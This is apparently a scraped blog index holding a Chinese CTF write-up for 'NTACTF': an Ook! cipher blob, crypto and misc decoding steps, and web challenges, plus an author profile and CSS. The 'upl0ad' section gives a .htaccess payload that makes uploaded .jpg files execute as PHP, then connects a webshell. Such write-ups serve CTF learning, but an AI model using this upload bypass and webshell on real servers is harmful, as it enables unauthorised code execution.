Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook?Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook?Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook?Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook?Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook!Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook?Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook?Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook.Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook?Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook!Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook?Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook.Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook.Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook?Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook!Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook?Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook!Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook?Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook?Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook.Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook?Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook!Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook?Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook!Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook?Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook. Ook? Ook. okk解密解得 12U2FsdGVkX18vD9yXN6V+1NjYFYFCgymFJQA91d7PSK1IdDacrXsNp4jEe3kCqRlaCoMbCTH1 开头为U2Fsd,为rabbit加密，解得 1flag&#123;21232f297a57a5a743894a0e4a801fc3&#125; Railfence Cipher 题目： 1fi9vlno1s1_&#125;ascadwa?gaa58ass&#123;69d 根据提示使用栅栏解密,W型栏数4 1flag&#123;asnioca65a19sd89aw1v_asds?&#125; Misc trip 题目： 查询Z86列车的时刻表得到 所以为苏州站 010 上图 根据题目使用010打开图片得到 解密后得到 1flag&#123;This_the_flag&#125; Seni0r h1gh school 从题目中，茶餐厅的电话搜索到 ![](NTACTF/senior high school/QQ截图20231024193411.png) 根据地图搜索到附近的高中 ![](NTACTF/senior high school/QQ截图20231024193544.png) zip两连击 从题目提示猜测zip密码为8为密码，且为199开头，使用工具爆破得到密码 打开文件夹后发现压缩包存在伪加密，使用010修改 打开压缩包后得到flag 好好用功读书 打开图片后，发现图片明显下方缺少，使用CRC工具恢复得到 扫描二维码后得到 1flag&#123;4av8s6dvasdadfa?svasdV_Asdv45v&#125; EXCEL 将表格中为1的格子涂黑后调整表格大小得到 扫描后得到 1ZmxhZ3tZb3VfZkluYWwxeV9mb1VuZF9NZS4xMTF9 解密后得到 1flag&#123;You_fInal1y_foUnd_Me.111&#125; explosion 打开后得到动图，抽帧后得到二维码，修复定位孔后得到 扫描得到 1R1kzRE1ZWldHRTNET04zQ0daU1RNWlJYR1EzRFNOUlJHVlRETU5KWEhBM1RBTlRER1pURE9NWldIRTNHTU5URkc1U0E9PT09== 使用base64，base32，hex解密后得到 1flag&#123;notia_explosion&#125; 裂开的flag 下载附件后发现文件格式头损坏，使用010修复后得到 under the moonlight 使用Stegsolve发现存在lsb隐写 Web 君子协议 打开网站后根据提示进入robots.txt,提示进入/FlAag.pHp，进入后下载文件得到 1MZWGCZ33GIYTEMZSIYZDSN2BGU3UCNKBG42DGOBZGRATARJUIE4DAMKGIMZX2=== 解密后得到 1flag&#123;21232F297A57A5A743894A0E4A801FC3&#125; 302 jump 打开题目后根据提示需打开demo.php,但存在302跳转，使用curl绕过 ![](NTACTF/302 jump/QQ截图20231024200053.png) 功德+1 打开后ctrl u 查看源代码，进入main.js文件，得到密文 1ZmxhZ3tPME8wSyFCMHVkbGU1c19CZW5lXmYxY2VuY2V9 解密后得到 1flag&#123;O0O0K!B0udle5s_Bene^f1cence&#125; 奇怪的按钮 打开后查看元素发现按钮被禁用，删除注释后得到flag NTAuser 进入网页后提示需要user为NTAuser，来自Network.com，在本地请求，使用burp拦截后修改请求 upl0ad 题目提示htaccess 文件上传 构造.htaccess文件上传 123&lt;FilesMatch &quot;\\.jpg&quot;&gt;\tSetHandler application/x-httpd-php&lt;/FilesMatch&gt; 构造木马图片并上传至服务器得到路径 1/uploads/1.jpg 使用蚁剑连接 PWN 瑞士军刀 nc 连接后cat flag 得到flag","tags":["writeup","CTF","NTACTF"],"categories":["Writeup"]},{"title":"about","path":"/about/index.html","content":"👋 关于我 你好，我是 g0ubu1i，一名专注于密码学与信息安全的学生 / 开发者 / 探索者。 💻 技术栈 安全方向：CTF（Crypto / Misc） 编程语言：Python，Go 🧩 项目 &amp; 兴趣 🔐 CTF 比赛参与者，偏好 Crypto / Misc 🛠️ 安全工具开发，偶尔写些脚本自动化事情 📫 联系方式 📮 邮箱：goubulibald@gmail.com 🪪 博客：https://blog.goubuli.online 🧑‍🚀 GitHub：https://github.com/g0ubu1i"},{"path":"/css/loading-bar.css","content":".pace { -webkit-pointer-events: none; pointer-events: none; -webkit-user-select: none; -moz-user-select: none; user-select: none; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; -ms-box-sizing: border-box; -o-box-sizing: border-box; box-sizing: border-box; -webkit-border-radius: 10px; -moz-border-radius: 10px; border-radius: 10px; -webkit-background-clip: padding-box; -moz-background-clip: padding; background-clip: padding-box; z-index: 2000; position: fixed; margin: auto; top: 12px; left: 0; right: 0; bottom: 0; width: 200px; height: 50px; overflow: hidden; } .pace .pace-progress { -webkit-box-sizing: border-box; -moz-box-sizing: border-box; -ms-box-sizing: border-box; -o-box-sizing: border-box; box-sizing: border-box; -webkit-border-radius: 2px; -moz-border-radius: 2px; border-radius: 2px; -webkit-background-clip: padding-box; -moz-background-clip: padding; background-clip: padding-box; -webkit-transform: translate3d(0, 0, 0); transform: translate3d(0, 0, 0); display: block; position: absolute; right: 100%; margin-right: -7px; width: 93%; top: 7px; height: 14px; font-size: 12px; background: #29d; color: #29d; line-height: 60px; font-weight: bold; font-family: Helvetica, Arial, \"Lucida Grande\", sans-serif; -webkit-box-shadow: 120px 0 #fff, 240px 0 #fff; -ms-box-shadow: 120px 0 #fff, 240px 0 #fff; box-shadow: 120px 0 #fff, 240px 0 #fff; } .pace .pace-progress:after { content: attr(data-progress-text); display: inline-block; position: fixed; width: 45px; text-align: right; right: 0; padding-right: 16px; top: 4px; } .pace .pace-progress[data-progress-text=\"0%\"]:after { right: -200px } .pace .pace-progress[data-progress-text=\"1%\"]:after { right: -198.14px } .pace .pace-progress[data-progress-text=\"2%\"]:after { right: -196.28px } .pace .pace-progress[data-progress-text=\"3%\"]:after { right: -194.42px } .pace .pace-progress[data-progress-text=\"4%\"]:after { right: -192.56px } .pace .pace-progress[data-progress-text=\"5%\"]:after { right: -190.7px } .pace .pace-progress[data-progress-text=\"6%\"]:after { right: -188.84px } .pace .pace-progress[data-progress-text=\"7%\"]:after { right: -186.98px } .pace .pace-progress[data-progress-text=\"8%\"]:after { right: -185.12px } .pace .pace-progress[data-progress-text=\"9%\"]:after { right: -183.26px } .pace .pace-progress[data-progress-text=\"10%\"]:after { right: -181.4px } .pace .pace-progress[data-progress-text=\"11%\"]:after { right: -179.54px } .pace .pace-progress[data-progress-text=\"12%\"]:after { right: -177.68px } .pace .pace-progress[data-progress-text=\"13%\"]:after { right: -175.82px } .pace .pace-progress[data-progress-text=\"14%\"]:after { right: -173.96px } .pace .pace-progress[data-progress-text=\"15%\"]:after { right: -172.1px } .pace .pace-progress[data-progress-text=\"16%\"]:after { right: -170.24px } .pace .pace-progress[data-progress-text=\"17%\"]:after { right: -168.38px } .pace .pace-progress[data-progress-text=\"18%\"]:after { right: -166.52px } .pace .pace-progress[data-progress-text=\"19%\"]:after { right: -164.66px } .pace .pace-progress[data-progress-text=\"20%\"]:after { right: -162.8px } .pace .pace-progress[data-progress-text=\"21%\"]:after { right: -160.94px } .pace .pace-progress[data-progress-text=\"22%\"]:after { right: -159.08px } .pace .pace-progress[data-progress-text=\"23%\"]:after { right: -157.22px } .pace .pace-progress[data-progress-text=\"24%\"]:after { right: -155.36px } .pace .pace-progress[data-progress-text=\"25%\"]:after { right: -153.5px } .pace .pace-progress[data-progress-text=\"26%\"]:after { right: -151.64px } .pace .pace-progress[data-progress-text=\"27%\"]:after { right: -149.78px } .pace .pace-progress[data-progress-text=\"28%\"]:after { right: -147.92px } .pace .pace-progress[data-progress-text=\"29%\"]:after { right: -146.06px } .pace .pace-progress[data-progress-text=\"30%\"]:after { right: -144.2px } .pace .pace-progress[data-progress-text=\"31%\"]:after { right: -142.34px } .pace .pace-progress[data-progress-text=\"32%\"]:after { right: -140.48px } .pace .pace-progress[data-progress-text=\"33%\"]:after { right: -138.62px } .pace .pace-progress[data-progress-text=\"34%\"]:after { right: -136.76px } .pace .pace-progress[data-progress-text=\"35%\"]:after { right: -134.9px } .pace .pace-progress[data-progress-text=\"36%\"]:after { right: -133.04px } .pace .pace-progress[data-progress-text=\"37%\"]:after { right: -131.18px } .pace .pace-progress[data-progress-text=\"38%\"]:after { right: -129.32px } .pace .pace-progress[data-progress-text=\"39%\"]:after { right: -127.46px } .pace .pace-progress[data-progress-text=\"40%\"]:after { right: -125.6px } .pace .pace-progress[data-progress-text=\"41%\"]:after { right: -123.74px } .pace .pace-progress[data-progress-text=\"42%\"]:after { right: -121.88px } .pace .pace-progress[data-progress-text=\"43%\"]:after { right: -120.02px } .pace .pace-progress[data-progress-text=\"44%\"]:after { right: -118.16px } .pace .pace-progress[data-progress-text=\"45%\"]:after { right: -116.3px } .pace .pace-progress[data-progress-text=\"46%\"]:after { right: -114.44px } .pace .pace-progress[data-progress-text=\"47%\"]:after { right: -112.58px } .pace .pace-progress[data-progress-text=\"48%\"]:after { right: -110.72px } .pace .pace-progress[data-progress-text=\"49%\"]:after { right: -108.86px } .pace 